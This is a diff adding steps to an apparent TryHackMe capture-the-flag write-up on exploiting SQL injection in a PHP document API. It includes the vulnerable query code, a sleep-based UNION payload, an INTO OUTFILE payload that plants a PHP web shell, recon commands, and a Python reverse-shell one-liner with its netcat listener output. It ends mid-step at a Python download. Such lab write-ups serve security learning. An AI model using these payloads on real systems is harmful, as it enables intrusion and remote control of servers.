@@ -71,8 +71,74 @@ Verify the vulnerability:
     Document ID: 1
     Document Name: Context_Red_Teaming_Guide.pdf
     Document Location: Context_Red_Teaming_Guide.pdf
- Since the following payload return an error:
 
-    http://10.10.224.181/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1%20order%20by%204
+Inspecting function.php, we know that the query expects only one row to be returned and that three fileds are selected:
 
-We know that the select return 3 fields
+    function GetDocumentDetails($conn, $documentid)
+    {
+        $sql = "select documentid, documentname, location from documents where documentid=".$documentid;
+        //echo $sql;
+        $result = mysqli_query($conn, $sql) or die(mysqli_error($conn));
+
+        if (mysqli_num_rows($result) === 1) {
+            return mysqli_fetch_assoc($result);
+        } else {
+            return null;
+        }
+    }
+
+We can futher test SQLi using the following query. The application will sleep for 10 second before to respond:
+
+    http://10.10.114.213/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1%20union%20select%201,2,sleep(10)
+
+Reading the questions we know that there is /var/www directory on the server, so we can suppose that the web root is /var/www/html. We can try to create a web shell exploiting the SQLi vulnerability. The query is the follows:
+
+       http://10.10.114.213/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1%20union%20select%20%27%27,%27%27,%27%3Cp%3E%3C?php%20system($_GET[%27%27c%27%27]);%20?%3E%3C/p%3E%27%20into%20outfile%20%27/var/www/html/help.php%27
+
+Now we should have a web shell responding at the following URL:
+
+    http://10.10.114.213/help.php?c=id
+    
+    1 Context_Red_Teaming_Guide.pdf Context_Red_Teaming_Guide.pdf
+    uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+    
+I issued some commands to discover a bit more about the server:
+
+    http://10.10.246.133/help.php?c=cat%20/etc/*rel*
+    DISTRIB_ID=Ubuntu DISTRIB_RELEASE=18.04 DISTRIB_CODENAME=bionic...
+    
+    http://10.10.246.133/help.php?c=uname%20-a
+    Linux app.ctx.ctf 4.4.0-1095-aws #106-Ubuntu SMP Wed Sep 18 13:33:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 
+
+I checked for some programs:
+
+    http://10.10.246.133/help.php?c=apt-cache%20policy%20curl
+    curl: Installed: (none)...
+
+Same reply for wget, netcat. I found that python3 is installed indeed.
+
+    http://10.10.246.133/help.php?c=apt-cache%20policy%20python3
+    python3: Installed: 3.6.7-1~18.04 Candidate: 3.6.7-1~18.04 Version table
+
+We can try to get a reverse shell using python3, set the following payload as c parameter in query string:
+
+    python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.142",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+The IP address is the THM VPN tun0 interface. We should get a reverse shell
+
+    nc -lvp 1234                      
+    listening on [any] 1234 ...
+    10.10.246.133: inverse host lookup failed: Unknown host
+    connect to [10.9.2.142] from (UNKNOWN) [10.10.246.133] 33036
+    www-data@app:~/html$ 
+
+Since python is installed we can use it to download files:
+
+    python3
+    Python 3.6.8 (default, Aug 20 2019, 17:12:48) 
+    [GCC 8.3.0] on linux
+    Type "help", "copyright", "credits" or "license" for more information.
+    >>> import urllib.request
+    
+
+    
